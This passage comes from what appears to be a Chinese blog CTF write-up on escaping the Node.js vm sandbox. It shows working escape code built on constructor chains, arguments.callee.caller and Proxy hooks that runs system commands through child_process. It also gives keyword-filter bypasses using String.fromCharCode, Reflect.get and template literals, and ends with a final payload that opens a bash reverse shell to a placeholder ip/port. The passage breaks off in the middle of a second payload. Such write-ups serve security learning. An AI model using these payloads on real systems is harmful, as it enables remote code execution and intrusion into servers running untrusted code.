src="/img/image-20240330172508221.png" alt="image-20240330172508221"></p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm.runInNewContext(`<span class="language-javascript"><span class="variable language_">this</span>.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process.env&#x27;</span></span>)(<span class="params"></span>)</span>`);</span><br></pre></td></tr></table></figure><p>那么我们是怎么实现逃逸的呢，首先这里面的this指向的是当前传递给<code>runInNewContext</code>的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的<code>()</code>是调用这个用Function的constructor生成的函数，最终返回了一个process对象。</p><p>下面这行代码也可以达到相同的效果：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const y1 = vm.runInNewContext(`<span class="language-javascript"><span class="variable language_">this</span>.<span class="property">toString</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>)(<span class="params"></span>)</span>`);</span><br></pre></td></tr></table></figure><p><code>this.toString.constructor</code> 表示当前环境下 <code>Function</code> 对象的构造函数，即 <code>Function</code> 构造函数。但<code>Function</code> 构造函数需要一个函数体作为参数，而不是一个简单的字符串。因此，代码将无法成功执行。</p><p>所以我们还需要通过对返回的process对象赋值来rce了</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y1<span class="selector-class">.mainModule</span><span class="selector-class">.require</span>(<span class="string">&#x27;child_process&#x27;</span>)<span class="selector-class">.execSync</span>(<span class="string">&#x27;whoami&#x27;</span>)<span class="selector-class">.toString</span>()</span><br></pre></td></tr></table></figure><p>上串代码尝试使用 <code>y1</code> 对象的 <code>mainModule.require()</code> 方法来获取 <code>child_process</code> 模块，并调用 <code>execSync()</code> 方法来执行命令 <code>whoami</code>，并将结果转换为字符串返回。</p><p>有一个问题，下段代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = <span class="string">`m + n`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123; <span class="attr">m</span>: <span class="number">1</span>, <span class="attr">n</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br></pre></td></tr></table></figure><p>我们能不能把<code>this.toString.constructor(&#39;return process&#39;)()</code>中的this换成{}呢？ {}的意思是在沙箱内声明了一个对象，也就是说这个对象是不能访问到global下的。</p><p>如果我们将this换成m和n也是访问不到的，因为数字，字符串，布尔这些都是primitive类型，他们在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），在沙盒内使用的mn已经不是原来的mn了，所以无法利用。</p><p>我们将mn改成其他类型就可以利用了：</p><p><img src="/img/20221118184151-9c9bb228-672d-1.png" alt="20221118184151-9c9bb228-672d-1"></p><h3 id="vm沙箱逃逸的一些其他情况"><a href="#vm沙箱逃逸的一些其他情况" class="headerlink" title="vm沙箱逃逸的一些其他情况"></a>vm沙箱逃逸的一些其他情况</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = <span class="string">`...`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello &#x27;</span> + res)</span><br></pre></td></tr></table></figure><p>我们现在的this为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性<code>arguments.callee.caller</code>，它可以返回函数的调用者。</p><p>我们上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的<code>arguments.callee.caller</code>就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了。</p><p>用以下代码进行逃逸：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">const vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line">const script = </span><br><span class="line">`<span class="language-javascript">(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> a = &#123;&#125;</span></span><br><span class="line"><span class="language-javascript">    a.<span class="property">toString</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>))();</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>()</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> a</span></span><br><span class="line"><span class="language-javascript">  &#125;)()</span>`;</span><br><span class="line"></span><br><span class="line">const sandbox = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line">const context = <span class="keyword">new</span> vm.createContext(sandbox);</span><br><span class="line">const res = vm.runInContext(script, context);</span><br><span class="line">console.log(<span class="string">&#x27;Hello &#x27;</span> + res)</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240330180408167.png" alt="image-20240330180408167"></p><p>我们来分析一下以上代码</p><p>我们在沙箱内先创建了一个对象，并且将这个对象的toString方法进行了重写，通过<code>arguments.callee.caller</code>获得到沙箱外的一个对象，利用这个对象的构造函数的构造函数返回了process，再调用process进行rce，沙箱外在console.log中通过字符串拼接的方式触发了这个重写后的toString函数。</p><p>详细解析：</p><blockquote><ol><li><code>(() =&gt; &#123; ... &#125;)()</code>: 这是一个立即执行函数表达式 (IIFE)，用于创建一个新的作用域并执行其中的代码块。</li><li><code>const a = &#123;&#125;</code>: 在函数内部定义了一个空对象 <code>a</code>，用于存储重写后的 <code>toString</code> 方法。</li><li><code>a.toString = function () &#123; ... &#125;</code>: 将对象 <code>a</code> 的 <code>toString</code> 方法重写为一个函数，这个函数中包含了一些逻辑。</li><li><code>const cc = arguments.callee.caller;</code>: 使用 <code>arguments.callee.caller</code> 获取当前调用函数的调用者。</li><li><code>const p = (cc.constructor.constructor(&#39;return process&#39;))();</code>: 通过调用者的构造函数构造了 <code>process</code> 对象的引用，并保存在变量 <code>p</code> 中。</li><li><code>return p.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()</code>: 通过 <code>p.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()</code> 获取当前用户的用户名，并将其作为字符串返回。</li><li><code>return a</code>: 返回重写后的对象 <code>a</code>。</li></ol></blockquote><p>如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用<code>Proxy</code>来劫持属性</p><p><a href="https://juejin.cn/post/6844904090116292616">Proxy 和 Reflect - 掘金 (juejin.cn)</a></p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">const vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line">const script = </span><br><span class="line">`<span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">(<span class="function">() =&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>))();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> a</span></span><br><span class="line"><span class="language-javascript">&#125;)()</span></span><br><span class="line"><span class="language-javascript"></span>`;</span><br><span class="line">const sandbox = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line">const context = <span class="keyword">new</span> vm.createContext(sandbox);</span><br><span class="line">const res = vm.runInContext(script, context);</span><br><span class="line">console.log(res.abc)</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240330181131868.png" alt="image-20240330181131868"></p><p>触发利用链的逻辑就是我们在<code>get:</code>这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。</p><p>但如果沙箱的返回值返回的是我们无法利用的对象或者没有返回值应该怎么进行逃逸呢？</p><p>我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">const vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line">const script = </span><br><span class="line">`<span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>))();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span>`;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    vm.runInContext(script, vm.createContext(<span class="built_in">Object</span>.create(<span class="literal">null</span>)));</span><br><span class="line">&#125;<span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    console.log(<span class="string">&quot;error:&quot;</span> + e) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后输出</p><p><img src="/img/image-20240330182752055.png" alt="image-20240330182752055"></p><p>这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。这段代码抛出异常的原因是脚本中的代理对象的 <code>get</code> 拦截器中存在错误。具体来说，<code>get</code> 拦截器中的操作试图访问 <code>caller</code> 属性，但 <code>caller</code> 属性在严格模式下不可用，因此会引发异常。有点像sql注入中的报错注入 😯 😯 😯</p><h3 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h3><p>vm沙箱隔离功能较弱，有很多逃逸的方法，所以第三方包vm2在vm的基础上做了一些优化，包括以下优化</p><p><img src="/img/20221118184410-ef77ed68-672d-1.png" alt="20221118184410-ef77ed68-672d-1"></p><ul><li><code>cli.js</code>实现了可以在命令行中调用vm2 也就是bin下的vm2。</li><li><code>contextify.js</code>封装了三个对象：<code>Contextify Decontextify propertyDescriptor</code>，并且针对global的Buffer类进行了代理。</li><li><code>main.js</code> 是vm2执行的入口，导出了<code>NodeVM VM</code>这两个沙箱环境，还有一个<code>VMScript</code>实际上是封装了<code>vm.Script</code>。</li><li><code>sandbox.js</code>针对global的一些函数和变量进行了拦截，比如<code>setTimeout，setInterval</code>等</li></ul><p>vm2相比vm做出很大的改进，其中之一就是利用了es6新增的proxy特性，从而使用钩子拦截对<code>constructor和__proto__</code>这些属性的访问。</p><h2 id="全世界最简单的CTF（vm2沙箱逃逸）"><a href="#全世界最简单的CTF（vm2沙箱逃逸）" class="headerlink" title="全世界最简单的CTF（vm2沙箱逃逸）"></a>全世界最简单的CTF（vm2沙箱逃逸）</h2><p>访问<code>/secret</code>路由得到源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"> </span><br><span class="line">app</span><br><span class="line">.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>))</span><br><span class="line">.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/public&#x27;</span>)))</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/home.html&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> pattern = <span class="regexp">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span>;</span><br><span class="line">    <span class="keyword">if</span>(code.<span class="title function_">match</span>(pattern))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;what can I say? hacker out!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> code = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line">        <span class="keyword">let</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">let</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">waf</span>(code)</span><br><span class="line">            <span class="keyword">let</span> result = vm.<span class="title function_">runInContext</span>(code, context);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">message</span>);</span><br><span class="line">            <span class="built_in">require</span>(<span class="string">&#x27;./hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/secret&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(process.<span class="property">__filename</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(process.<span class="property">__filename</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listen on 3000&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>拿给gpt说是一个vm沙箱，那就是vm沙箱逃逸了，正常payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">     <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">         <span class="keyword">const</span> c = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">         <span class="keyword">const</span> p = (c.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>))();</span><br><span class="line">         <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure><p>题目waf：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let pattern = /(process|<span class="string">\[.*?\]</span>|<span class="string">exec</span>|<span class="string">spawn</span>|<span class="string">Buffer</span>|<span class="string">\\</span>|<span class="string">\+</span>|<span class="string">concat</span>|<span class="string">eval</span>|<span class="string">Function)/g;</span></span><br></pre></td></tr></table></figure><p>过滤了<code>process</code>、<code>[...]</code>（方括号中的任意字符）、<code>exec</code>、<code>spawn</code>、<code>Buffer</code>、<code>\</code>（反斜杠）、<code>+</code>（加号）、<code>concat</code>、<code>eval</code>、<code>Function</code>，waf ban了中括号和加号，不能用拼接绕过；ban了eval；ban了<code>\</code>，不能用十六进制和unicode</p><h3 id="方法一：反射"><a href="#方法一：反射" class="headerlink" title="方法一：反射"></a>方法一：反射</h3><p>星盟的解：</p><p>用String.fromCharCode绕过process</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mainModule</span>.require(String.fromCharCode(<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>))</span><br></pre></td></tr></table></figure><blockquote><p>上行代码使用了 <code>mainModule.require</code> 方法，并传入了一个参数，参数值是通过 <code>String.fromCharCode</code> 函数生成的字符串。该字符串实际上是 <code>&#39;child_process&#39;</code> 的字符编码，因此 <code>mainModule.require</code> 的作用是加载 Node.js 的 <code>child_process</code> 模块，故上串代码也就相当于mainModule.require(‘child_process’)</p></blockquote><p>接下来就是用Reflect.get方法绕过exec，详细文章参考：<a href="https://www.anquanke.com/post/id/237032">https://www.anquanke.com/post/id/237032</a></p><p>Reflect.get(target, propertyKey[, receiver])的作用是获取对象身上某个属性的值，类似于target[name]。所以取eval函数的方式可以变成Reflect.get(global, Reflect.ownKeys(global).find(x&#x3D;&gt;x.includes(‘eval’)))</p><blockquote><ol><li><code>Reflect.ownKeys(global)</code> 返回了全局对象 <code>global</code> 自身的所有属性的键名组成的数组。</li><li><code>Array.prototype.find()</code> 方法遍历这个数组，找到第一个符合条件的属性键名，即包含 <code>&#39;eval&#39;</code> 字符串。</li><li><code>Reflect.get(global, ...)</code> 使用找到的属性键名作为参数，从全局对象 <code>global</code> 中获取对应属性的值。</li></ol></blockquote><p>但我们本质上其实是调用的eval函数底层的exec方法，const p &#x3D; (cc.constructor.constructor(‘return global’))();获取js里面的全局函数集合</p><p><img src="/img/image-20240331110927064.png" alt="image-20240331110927064"></p><p>const b &#x3D; Reflect.get(p, Reflect.ownKeys(p).find(x&#x3D;&gt;x.includes(‘pro’))).mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115));</p><blockquote><p>这段代码的目的是获取对象 <code>p</code> 中包含 <code>pro</code> 字符串的属性的值，并调用该属性值的 <code>mainModule.require()</code> 方法，传入特定的字符串<code>child_process</code>作为参数。简单来说就是调用<code>child_process</code></p></blockquote><p>最终思路：先调用集合中的键为process下面的mainModule.require(‘child_process’)的模块，Reflect.get(b, Reflect.ownKeys(b).find(x&#x3D;&gt;x.includes(‘ex’)))去找child_process底层的exec函数，再反弹shell。这道题是个无回显，怪不得当时输啥都不给我回显，输waf也不给我回显what can I say，我还以为环境出问题了😅，下次碰到就知道是无回显了</p><p>最终payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return global&#x27;</span></span>))();</span><br><span class="line">            <span class="keyword">const</span> b = <span class="title class_">Reflect</span>.<span class="title function_">get</span>(p, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(p).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;pro&#x27;</span>))).<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">get</span>(b, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(b).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;ex&#x27;</span>)))(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h3 id="方法二：fork函数、逆序、base64、模板字母量"><a href="#方法二：fork函数、逆序、base64、模板字母量" class="headerlink" title="方法二：fork函数、逆序、base64、模板字母量"></a>方法二：fork函数、逆序、base64、模板字母量</h3><p>Z3师傅的解：</p><p>把过滤掉的关键字可以用模板字面量绕过，例如</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">child_process转成(`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)</span><br><span class="line">.execSync转成[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`]  </span><br></pre></td></tr></table></figure><p>原理：</p><p><img src="/img/image-20240331113204328.png" alt="image-20240331113204328"></p><p>但是中括号 [ ]被waf了，所以想到child_process下面有5个函数</p><ol><li><strong>exec</strong>: 用于执行 shell 命令。</li><li><strong>execFile</strong>: 用于执行可执行文件。</li><li><strong>spawn</strong>: 用于生成新的进程。</li><li><strong>fork</strong>: 用于衍生新的 Node.js 子进程，类似于 <code>spawn</code>，但专门用于衍生 Node.js 子进程。</li><li><strong>execSync</strong>: 是 <code>exec</code> 函数的同步版本，用于同步执行 shell 命令。</li></ol><p>只剩下fork函数了，那么思路就是在上面poc基础上，通过fs进行文件写文件，然后用fork进行加载，为了逃逸waf，可以逆序内容，然后再反序过来，写入文件后再调用fork加载达到反弹shell，由于过滤了 + ，所以 base64 编码后有 + 号的要再编码一次<br>上述字符串包含了单引号或双引号，为了避免引号冲突， content 赋值要用 反引号括起来，</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const content=` 内容 ` </span><br></pre></td></tr></table></figure><p>故最终payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line"> <span class="attr">get</span>: <span class="keyword">function</span>(<span 